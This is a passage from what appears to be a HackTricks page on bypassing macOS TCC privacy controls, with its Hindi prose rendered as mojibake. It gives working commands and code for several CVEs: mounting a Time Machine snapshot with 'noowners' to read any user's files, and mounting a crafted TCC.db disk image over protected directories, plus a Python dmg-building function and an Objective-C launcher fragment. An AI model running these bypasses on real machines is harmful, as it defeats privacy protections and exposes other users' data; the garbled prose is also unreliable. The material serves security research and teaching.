NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## рдорд╛рдЙрдВрдЯ рдХрд░рдХреЗ

### CVE-2020-9771 - рдорд╛рдЙрдВрдЯ\_apfs TCC рдмрд╛рдИрдкрд╛рд╕ рдФрд░ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдПрд╕реНрдХреЗрд▓реЗрд╢рди

**рдХреЛрдИ рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** (рд╣рд╛рд▓рд╛рдВрдХрд┐ рдЕрдирд╛рдзрд┐рдХреГрдд рднреА) рдПрдХ рдЯрд╛рдЗрдо рдорд╢реАрди рд╕реНрдиреИрдкрд╢реЙрдЯ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрд╕ рд╕реНрдиреИрдкрд╢реЙрдЯ рдХреЗ **рд╕рднреА рдлрд╝рд╛рдЗрд▓реЛрдВ рддрдХ рдкрд╣реБрдВрдЪ** рдХрд░ рд╕рдХрддрд╛ рд╣реИред\
**рдХреЗрд╡рд▓ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬреНрдб** рдЬреЛ рдЖрд╡реЗрджрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ (рдЬреИрд╕реЗ `Terminal`) рдХреЛ **рдлреБрд▓ рдбрд┐рд╕реНрдХ рдПрдХреНрд╕реЗрд╕** (FDA) рдПрдХреНрд╕реЗрд╕ (`kTCCServiceSystemPolicyAllfiles`) рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдЬреЛ рдПрдХ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХреА рдЬрд╛рдиреА рдЪрд╛рд╣рд┐рдПред

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

рдПрдХ рдФрд░ рд╡рд┐рд╕реНрддреГрдд рд╡реНрдпрд╛рдЦреНрдпрд╛ [**рдореВрд▓ рд░рд┐рдкреЛрд░реНрдЯ рдореЗрдВ рдорд┐рд▓ рд╕рдХрддреА рд╣реИ**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

### CVE-2021-1784 рдФрд░ CVE-2021-30808 - TCC рдлрд╝рд╛рдЗрд▓ рдкрд░ рдорд╛рдЙрдВрдЯ рдХрд░реЗрдВ

рдпрджреНрдпрдкрд┐ TCC DB рдлрд╝рд╛рдЗрд▓ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ, рд▓реЗрдХрд┐рди рдПрдХ рдирдИ TCC.db рдлрд╝рд╛рдЗрд▓ рдХреЛ **рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдкрд░ рдорд╛рдЙрдВрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛**:

{% code overflow="wrap" %}
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %}
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
рдЖрдк рдореВрд▓ рд▓реЗрдЦ рдореЗрдВ **рдкреВрд░реНрдг рдЙрддреНрдкрд╛рджрди** рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред [**рдореВрд▓ рд▓реЗрдЦ**](https://theevilbit.github.io/posts/cve-2021-30808/) рдореЗрдВред

### asr

рдЯреВрд▓ **`/usr/sbin/asr`** рдХреЛ TCC рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдЫреЛрдбрд╝рдХрд░ рдкреВрд░реА рдбрд┐рд╕реНрдХ рдХреА рдХреЙрдкреА рдФрд░ рдЙрд╕реЗ рджреВрд╕рд░реА рдЬрдЧрд╣ рдорд╛рдЙрдВрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рдерд╛ред

### рд╕реНрдерд╛рди рд╕реЗрд╡рд╛рдПрдВ

**`/var/db/locationd/clients.plist`** рдореЗрдВ рддреАрд╕рд░рд╛ TCC рдбреЗрдЯрд╛рдмреЗрд╕ рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рд╕реНрдерд╛рди рд╕реЗрд╡рд╛рдУрдВ рддрдХ рдкрд╣реБрдВрдЪ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╡рд╛рд▓реЗ рдЧреНрд░рд╛рд╣рдХреЛрдВ рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИред\
**`/var/db/locationd/` рдбрд┐рдПрдордЬреА рдорд╛рдЙрдВрдЯрд┐рдВрдЧ рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рдирд╣реАрдВ рдерд╛**, рдЗрд╕рд▓рд┐рдП рд╣рдорд╛рд░реА рдЦреБрдж рдХреА рдкреНрд▓рд┐рд╕реНрдЯ рдорд╛рдЙрдВрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛ред

## рд╕реНрдЯрд╛рд░реНрдЯрдЕрдк рдРрдкреНрд╕ рджреНрд╡рд╛рд░рд╛

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## grep рджреНрд╡рд╛рд░рд╛

рдХрдИ рдмрд╛рд░ рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдЬреИрд╕реЗ рдИрдореЗрд▓, рдлрд╝реЛрди рдирдВрдмрд░, рд╕рдВрджреЗрд╢... рд╕рдВрд░рдХреНрд╖рд┐рдд рдирд╣реАрдВ рд╕реНрдерд╛рдиреЛрдВ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреА рд╣реИрдВ (рдЬреЛ Apple рдореЗрдВ рдПрдХ рд╕рдВрдХрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдЧрд┐рдиреА рдЬрд╛рддреА рд╣реИрдВ)ред

<figure><img src="../../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

## рд╕рдВрд╢реНрд▓реЗрд╖рд┐рдд рдХреНрд▓рд┐рдХ

рдпрд╣ рдЕрдм рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ [**рдкрд╣рд▓реЗ рдХрд░рддрд╛ рдерд╛**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphics рдЗрд╡реЗрдВрдЯреНрд╕**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдФрд░ рддрд░реАрдХрд╛:

<figure><img src="../../../../../.gitbook/assets/image (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

## рд╕рдВрджрд░реНрдн

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд░рдЦрддреЗ рд╣реИрдВ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **[ЁЯТм](https://emojipedia.org/speech-balloon/) [Discord рд╕рдореВрд╣](https://discord.gg/hRep4RUj7f) рдпрд╛ [telegram рд╕рдореВрд╣](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛** рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред**

</details>
